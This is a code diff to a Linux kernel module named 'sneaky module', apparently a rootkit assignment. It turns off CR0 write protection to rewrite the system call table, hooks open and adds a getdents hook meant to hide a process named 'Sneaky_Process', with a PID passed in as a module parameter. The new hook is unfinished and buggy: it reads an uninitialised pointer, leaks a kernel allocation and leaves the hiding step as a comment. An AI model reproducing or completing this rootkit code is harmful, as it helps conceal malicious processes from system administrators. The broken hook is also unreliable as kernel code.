@@ -8,21 +8,18 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <linux/syscalls.h>
+#include <linux/slab.h>
+/*
 #include <sys/syscall.h>
 #include <sys/stat.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
 #include <fcntl.h>
-#include <dirent.h>
-//interpret linux Dirent correctly:
-struct linux_dirent {
-  u64 d_ino;
-  s64 d_off;
-  unsigned short d_reclen;
-  char d_name[BUFFLEN];
-}
-
+*/
+//#include <dirent.h>
+#define BUFFLEN 1024
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -30,6 +27,21 @@ struct linux_dirent {
 //so that we can change the read/write permissions of kernel pages.
 #define read_cr0() (native_read_cr0())
 #define write_cr0(x) (native_write_cr0(x))
+
+//interpret linux Dirent correctly:
+struct linux_dirent {
+  u64 d_ino;
+  s64 d_off;
+  unsigned short d_reclen;
+  char d_name[BUFFLEN];
+};
+
+//Global Variables for insmod: just need PID
+static int   pid = -1;
+//obtain PID from outer program
+module_param(pid, int, 0);
+
+
 
 //These are function pointers to the system calls that change page
 //permissions for the given address (page) to read-only or read-write.
@@ -58,13 +70,47 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 }
 
 
+asmlinkage int (*getdents_original)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+
+asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+{
+  printk(KERN_INFO "Sneaky Get DENTS!\n");
+
+  //initial Direct structure
+  struct linux_dirent *dir;
+
+  //cast dirent structure to char * to manipulate byte by byte
+  char *exact = (char *) dir;
+  //allocate memory for count bytes associated with all dirents read for specific file descriptor 
+  //we are in kernel space so allocate memory from kernel memory
+  char *mem = kmalloc(count, GFP_KERNEL);
+
+  //Need to allow kernel addresses to span Kernel Virtual Memory space with below lines
+  
+
+  //save previous address space value: want this restored so we don't give access to Kernel address space
+  //beyond our below system calls
+  mm_segment_t userspace = get_fs();
+  //the below macro allows us to pass addresses derived from Kernel Space to our system calls 
+  set_fs(KERNEL_DS);
+  //we cast as dirent but have as char * so we can increment byte stream 1 byte at a time
+  int numbytes = getdents_original(fd, (struct linux_dirent*) exact, count);
+  //ensure addresses are once again only in user space
+  set_fs(userspace);
+
+  //iterate through numbytes and compare name to "Sneaky_Process" --> skip that one before returning
+  
+  return numbytes;
+}
+
+
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
   struct page *page_ptr;
 
   //See /var/log/syslog for kernel print output
-  printk(KERN_INFO "Sneaky module being loaded.\n");
+  printk(KERN_ALERT "Sneaky module being loaded.\n");
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -84,6 +130,8 @@ static int initialize_sneaky_module(void)
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
+
+  printk(KERN_ALERT "Hello process ID is: %i!\n", pid);
 
   return 0;       // to show a successful load 
 }  
@@ -112,6 +160,8 @@ static void exit_sneaky_module(void)
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
+
+  printk(KERN_INFO "Cleaning up module.\n");
 }  
 
 //allows renaming of cleanup and init functions
